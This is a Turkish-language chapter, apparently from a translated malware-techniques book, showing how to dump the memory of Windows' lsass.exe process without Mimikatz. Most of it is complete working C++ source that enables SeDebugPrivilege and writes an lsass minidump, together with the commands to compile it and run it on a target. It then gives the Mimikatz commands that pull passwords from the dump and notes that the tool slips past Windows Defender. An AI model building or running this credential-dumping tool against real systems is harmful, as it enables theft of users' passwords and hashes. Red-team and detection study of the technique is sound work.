\newpage
\subsection{41. kötü amaçlı yazılım geliştirme hilesi. lsass.exe dökümü. Basit C++ örneği.}

﷽

![av-evasion](./images/95/2023-05-11_16-29.png){width="80%"}      

Bugün, Mimikatz kullanmadan nasıl `lsass.exe` dökümü alabileceğimizi göstermek istiyorum: `MiniDumpWriteDump` API'si aracılığıyla. [Mimikatz](https://github.com/gentilkiwi/mimikatz) çok ünlü bir araç olduğu için kolayca tespit edilebiliyor, bu nedenle siber saldırganlar, onun bazı özelliklerini yeniden uygulamak için yeni hileler buluyorlar.      

### pratik örnek  

Peki, basit bir `lsass.exe` işlem dökümanı nasıl yazabiliriz? `MiniDumpWriteDump` kullanıyoruz:    

```cpp
BOOL MiniDumpWriteDump(
  [in] HANDLE                            hProcess,
  [in] DWORD                             ProcessId,
  [in] HANDLE                            hFile,
  [in] MINIDUMP_TYPE                     DumpType,
  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);
```

`MiniDumpWriteDump` işlevi, bir Windows API işlevidir ve bir minidump dosyası oluşturur. Bu dosya, işlev çağrıldığında uygulamanın durumunun küçük bir anlık görüntüsüdür. Bu dosya, hata ayıklama amacıyla kullanışlı olabilir, çünkü istisna bilgilerini, yüklenen DLL'lerin listesini, yığın bilgilerini ve diğer sistem durumu bilgilerini içerir.     

İlk olarak, `lsass.exe` işlemini, aşağıdaki gibi bir işlev aracılığıyla buluruz:

```cpp
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}
```

Bir saldırgan olarak `LSASS` dökümü alabilmek için `SeDebugPrivilege` ayrıcalığına sahip olmak gereklidir:    

```cpp
// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, 
  &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
  (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
  return res;
}
```

Ardından, döküm oluşturmak için şu adımları izleyebiliriz:      

```cpp
// minidump lsass.exe
BOOL createMiniDump() {
  bool dumped = FALSE;
  int pid = findMyProc("lsass.exe");
  HANDLE ph = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
  HANDLE out = CreateFile((LPCTSTR)"c:\\temp\\lsass.dmp", GENERIC_ALL, 0,
  NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (ph && out != INVALID_HANDLE_VALUE) {
    dumped = MiniDumpWriteDump(ph, pid, out, (MINIDUMP_TYPE)0x00000002, NULL, 
    NULL, NULL);
    printf(dumped ? "successfully dumped to lsaas.dmp :)\n" : 
    "failed to dump :(\n");
  } 
  return dumped; 
}
```

Tam kaynak kodu şu şekilde görünecektir: `hack.cpp`:     

```cpp
/*
 * hack.cpp - Dump lsass without mimikatz. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/2023/05/11/malware-tricks-28.html
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")

int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, 
  &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
   (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
  return res;
}

// minidump lsass.exe
BOOL createMiniDump() {
  bool dumped = FALSE;
  int pid = findMyProc("lsass.exe");
  HANDLE ph = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
  HANDLE out = CreateFile((LPCTSTR)"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, 
  NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (ph && out != INVALID_HANDLE_VALUE) {
    dumped = MiniDumpWriteDump(ph, pid, out, (MINIDUMP_TYPE)0x00000002, NULL, 
    NULL, NULL);
    printf(dumped ? "successfully dumped to lsaas.dmp :)\n" : "failed to dump :(\n");
  } 
  return dumped; 
}

int main(int argc, char* argv[]) {
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  if (!createMiniDump()) return -1;
  return 0;
}
```

As you can see, do not forget to add `dbghelp.lib` as a dependency:     

Gördüğünüz gibi,` dbghelp.lib` dosyasını bağımlılık olarak eklemeyi unutmamalısınız:    

```cpp
#pragma comment (lib, "dbghelp.lib")
```

### demo

Şimdi her şeyin nasıl çalıştığını görelim. Döküm aracımızı saldırganın makinesinde (`kali x64`) derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -ldbghelp
```

![av-evasion](./images/95/2023-05-11_15-32.png){width="80%"}      

Ardından, bunu hedef makinede (benim durumumda `Windows 10 x64`) çalıştırın:     

```powershell
.\hack.exe
```

![av-evasion](./images/95/2023-05-11_16-05.png){width="80%"}      

Gördüğünüz gibi, `lsass.dmp` dosyası çalışma dizinine (`C:\\temp\\`) dökülmüş durumda.       

Sonrasında, `mimikatz`'i yükleyerek döküm dosyasını açabilir ve şifreleri dökebilirsiniz:

```powershell
.\mimikatz.exe
sekurlsa::minidump c:\temp\lsass.dmp
sekurlsa::logonpasswords
```

![av-evasion](./images/95/2023-05-11_16-28_1.png){width="80%"}      

![av-evasion](./images/95/2023-05-11_16-28.png){width="80%"}      

İlginç bir nokta: `mimikatz v2.2.0`'da Windows'umda çalışmıyor:     

![av-evasion](./images/95/2023-05-11_16-12.png){width="80%"}      

Not edin ki, Windows Defender `Windows 10`'da hemen `mimikatz`'i işaretliyor...  
ancak `hack.exe`'nin çalışmasına izin veriyor.      

Peki, hile nedir? Aşağıdaki yolu izleyerek bir saldırı gerçekleştirebiliriz:     
- `hack.exe`'yi hedef makinede çalıştırın      
- böylece `lsass.dmp` çalışma dizinine dökülür        
- `lsass.dmp` dosyasını çevrimdışına alıp saldırganın Windows makinesine taşıyın       
- `mimikatz`'i açın ve dump dosyasını yükleyin        
- hedef makinesinin şifrelerini saldırganın makinesinde dökün!        

Bu sadece bir yöntem, gelecekte başka yöntemler hakkında da bahsedeceğim.     

Bu hile, birçok APT ve siber saldırı aracında kullanılmaktadır. Örneğin, [Cobalt Strike](https://attack.mitre.org/software/S0154), `LSASS` belleğine enjekte etmek ve şifre hash'lerini dökmek için bir iş başlatabilir. [Fox Kitten](https://attack.mitre.org/groups/G0117) ve [HAFNIUM](https://attack.mitre.org/groups/G0125), `LSASS` işlem belleğini dökmek için `procdump` kullandı.      

Umarım bu yazı, bu ilginç tekniğe dikkat çekerek mavi takımın farkındalığını artırır ve kırmızı takımın cephaneliğine bir silah ekler.     

[MITRE ATT&CK - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)       
[APT3](https://attack.mitre.org/groups/G0022)       
[Cobalt Strike](https://attack.mitre.org/software/S0154)        
[Fox Kitten](https://attack.mitre.org/groups/G0117)      
[HAFNIUM](https://attack.mitre.org/groups/G0125)      
[mimikatz](https://github.com/gentilkiwi/mimikatz)         
[MiniDumpWriteDump](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-05-11-malware-tricks-28)     
